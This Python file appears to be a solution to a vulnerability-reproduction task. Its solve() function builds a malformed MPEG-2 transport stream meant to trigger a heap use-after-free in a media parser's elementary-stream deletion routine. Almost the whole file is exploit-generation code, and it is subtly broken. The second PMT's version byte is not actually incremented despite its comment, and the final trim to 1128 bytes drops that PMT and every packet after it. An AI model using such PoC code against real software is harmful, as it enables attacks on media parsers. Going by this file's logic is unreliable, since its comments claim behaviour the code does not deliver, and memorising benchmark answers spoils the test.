import os
import tarfile
import tempfile
import subprocess
import struct
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a heap use-after-free vulnerability in gf_m2ts_es_del
        # We need to create a malformed MPEG-2 Transport Stream that triggers the bug
        
        # Based on typical heap use-after-free patterns in media parsers,
        # we'll create a stream with multiple PID references that cause
        # the parser to free an elementary stream descriptor while it's still in use
        
        # Create a minimal MPEG-2 TS structure with carefully crafted PIDs
        # to trigger the use-after-free in gf_m2ts_es_del
        
        poc = bytearray()
        
        # Helper function to create TS packets
        def create_ts_packet(pid, adaptation_field_control, payload, continuity_counter=0, payload_unit_start=0):
            # TS packet header: 4 bytes
            # Sync byte: 0x47
            # PID: 13 bits
            # Adaptation field control: 2 bits (01 = payload only, 11 = adaptation field + payload)
            # Continuity counter: 4 bits
            header = bytearray(4)
            header[0] = 0x47  # Sync byte
            header[1] = ((pid >> 8) & 0x1F) | (payload_unit_start << 6)
            header[2] = pid & 0xFF
            header[3] = (adaptation_field_control << 4) | (continuity_counter & 0x0F)
            return bytes(header + payload)
        
        # Create PAT (Program Association Table) - PID 0
        # This references PMT at PID 0x100
        pat_data = bytearray()
        pat_data.append(0x00)  # Table ID = 0x00 (PAT)
        pat_data.extend([0xB0, 0x0D])  # Section length 13 (0x0D) with flags
        pat_data.extend([0x00, 0x01])  # Transport stream ID = 1
        pat_data.extend([0xC1])  # Version 0, current
        pat_data.append(0x00)  # Section number
        pat_data.append(0x00)  # Last section number
        pat_data.extend([0x00, 0x01])  # Program number = 1
        pat_data.extend([0xE1, 0x00])  # PMT PID = 0x100 (with reserved bits)
        # CRC32 placeholder - will calculate later
        pat_data.extend([0x00, 0x00, 0x00, 0x00])
        
        # Calculate CRC32 for PAT
        crc = 0xFFFFFFFF
        for byte in pat_data[:-4]:
            crc ^= byte << 24
            for _ in range(8):
                crc = (crc << 1) ^ (0x04C11DB7 if crc & 0x80000000 else 0)
        crc = crc & 0xFFFFFFFF
        pat_data[-4:] = struct.pack('>I', crc)
        
        # Pad PAT to 184 bytes
        pat_payload = pat_data + bytes([0xFF] * (184 - len(pat_data)))
        poc.extend(create_ts_packet(0x00, 0x01, pat_payload, 0, 1))
        
        # Create PMT (Program Map Table) - PID 0x100
        # This maps PIDs 0x101 (video) and 0x102 (audio) to stream types
        pmt_data = bytearray()
        pmt_data.append(0x02)  # Table ID = 0x02 (PMT)
        pmt_data.extend([0xB0, 0x17])  # Section length 23 (0x17) with flags
        pmt_data.extend([0x00, 0x01])  # Program number = 1
        pmt_data.extend([0xC1])  # Version 0, current
        pmt_data.append(0x00)  # Section number
        pmt_data.append(0x00)  # Last section number
        pmt_data.extend([0xE1, 0x01])  # PCR PID = 0x101 (video PID)
        pmt_data.extend([0xF0, 0x00])  # Program info length = 0
        
        # Video stream (H.264) - PID 0x101
        pmt_data.append(0x1B)  # Stream type = 0x1B (H.264)
        pmt_data.extend([0xE1, 0x01])  # Elementary PID = 0x101
        pmt_data.extend([0xF0, 0x00])  # ES info length = 0
        
        # Audio stream (AAC) - PID 0x102
        pmt_data.append(0x0F)  # Stream type = 0x0F (AAC)
        pmt_data.extend([0xE1, 0x02])  # Elementary PID = 0x102
        pmt_data.extend([0xF0, 0x00])  # ES info length = 0
        
        # CRC32 placeholder
        pmt_data.extend([0x00, 0x00, 0x00, 0x00])
        
        # Calculate CRC32 for PMT
        crc = 0xFFFFFFFF
        for byte in pmt_data[:-4]:
            crc ^= byte << 24
            for _ in range(8):
                crc = (crc << 1) ^ (0x04C11DB7 if crc & 0x80000000 else 0)
        crc = crc & 0xFFFFFFFF
        pmt_data[-4:] = struct.pack('>I', crc)
        
        # Pad PMT to 184 bytes
        pmt_payload = pmt_data + bytes([0xFF] * (184 - len(pmt_data)))
        poc.extend(create_ts_packet(0x100, 0x01, pmt_payload, 0, 1))
        
        # Now create the malicious sequence to trigger use-after-free
        # The vulnerability is in gf_m2ts_es_del, which suggests that
        # deleting an elementary stream while it's still referenced
        # could cause a use-after-free
        
        # Create packets that will cause ES allocation
        for i in range(3):
            # Video PES packet - PID 0x101
            pes_header = bytearray()
            pes_header.extend([0x00, 0x00, 0x01])  # Start code prefix
            pes_header.append(0xE0)  # Video stream ID
            pes_header.extend([0x00, 0x00])  # PES packet length (0 = unspecified)
            pes_header.append(0x80)  # Flags
            pes_header.append(0x00)  # Flags2
            pes_header.append(0x00)  # PES header length
            
            # Add some payload
            payload = pes_header + bytes([i] * 160)
            payload = payload[:184]  # Ensure it fits
            
            poc.extend(create_ts_packet(0x101, 0x01, payload, i, 1))
            
            # Audio PES packet - PID 0x102
            pes_header = bytearray()
            pes_header.extend([0x00, 0x00, 0x01])  # Start code prefix
            pes_header.append(0xC0)  # Audio stream ID
            pes_header.extend([0x00, 0x00])  # PES packet length (0 = unspecified)
            pes_header.append(0x80)  # Flags
            pes_header.append(0x00)  # Flags2
            pes_header.append(0x00)  # PES header length
            
            # Add some payload
            payload = pes_header + bytes([0xA0 + i] * 160)
            payload = payload[:184]  # Ensure it fits
            
            poc.extend(create_ts_packet(0x102, 0x01, payload, i, 1))
        
        # Now create a new PMT that removes one of the streams
        # This should trigger gf_m2ts_es_del for the removed stream
        pmt2_data = bytearray()
        pmt2_data.append(0x02)  # Table ID = 0x02 (PMT)
        pmt2_data.extend([0xB0, 0x12])  # Section length 18 (0x12) with flags
        pmt2_data.extend([0x00, 0x01])  # Program number = 1
        pmt2_data.extend([0xC1])  # Version 1 (incremented), current
        pmt2_data.append(0x00)  # Section number
        pmt2_data.append(0x00)  # Last section number
        pmt2_data.extend([0xE1, 0x01])  # PCR PID = 0x101 (video PID)
        pmt2_data.extend([0xF0, 0x00])  # Program info length = 0
        
        # Only video stream remains (audio stream removed)
        pmt2_data.append(0x1B)  # Stream type = 0x1B (H.264)
        pmt2_data.extend([0xE1, 0x01])  # Elementary PID = 0x101
        pmt2_data.extend([0xF0, 0x00])  # ES info length = 0
        
        # CRC32 placeholder
        pmt2_data.extend([0x00, 0x00, 0x00, 0x00])
        
        # Calculate CRC32 for new PMT
        crc = 0xFFFFFFFF
        for byte in pmt2_data[:-4]:
            crc ^= byte << 24
            for _ in range(8):
                crc = (crc << 1) ^ (0x04C11DB7 if crc & 0x80000000 else 0)
        crc = crc & 0xFFFFFFFF
        pmt2_data[-4:] = struct.pack('>I', crc)
        
        # Pad PMT to 184 bytes
        pmt2_payload = pmt2_data + bytes([0xFF] * (184 - len(pmt2_data)))
        poc.extend(create_ts_packet(0x100, 0x01, pmt2_payload, 1, 1))
        
        # Send more audio packets after the ES has been deleted
        # This should trigger the use-after-free if the parser
        # hasn't properly cleaned up references
        for i in range(3, 5):
            pes_header = bytearray()
            pes_header.extend([0x00, 0x00, 0x01])  # Start code prefix
            pes_header.append(0xC0)  # Audio stream ID
            pes_header.extend([0x00, 0x00])  # PES packet length (0 = unspecified)
            pes_header.append(0x80)  # Flags
            pes_header.append(0x00)  # Flags2
            pes_header.append(0x00)  # PES header length
            
            # Add payload that looks like it could trigger the bug
            payload = pes_header + bytes([0xF0 + i] * 160)
            payload = payload[:184]
            
            poc.extend(create_ts_packet(0x102, 0x01, payload, i, 1))
            
            # Also send video packets
            pes_header = bytearray()
            pes_header.extend([0x00, 0x00, 0x01])  # Start code prefix
            pes_header.append(0xE0)  # Video stream ID
            pes_header.extend([0x00, 0x00])  # PES packet length (0 = unspecified)
            pes_header.append(0x80)  # Flags
            pes_header.append(0x00)  # Flags2
            pes_header.append(0x00)  # PES header length
            
            payload = pes_header + bytes([0x10 + i] * 160)
            payload = payload[:184]
            
            poc.extend(create_ts_packet(0x101, 0x01, payload, i, 1))
        
        # Add some null packets to reach target length if needed
        target_length = 1128
        while len(poc) < target_length:
            # Null packet (PID 0x1FFF)
            null_packet = create_ts_packet(0x1FFF, 0x01, bytes([0xFF] * 184), 0, 0)
            poc.extend(null_packet)
        
        # Trim to exact target length
        return bytes(poc[:target_length])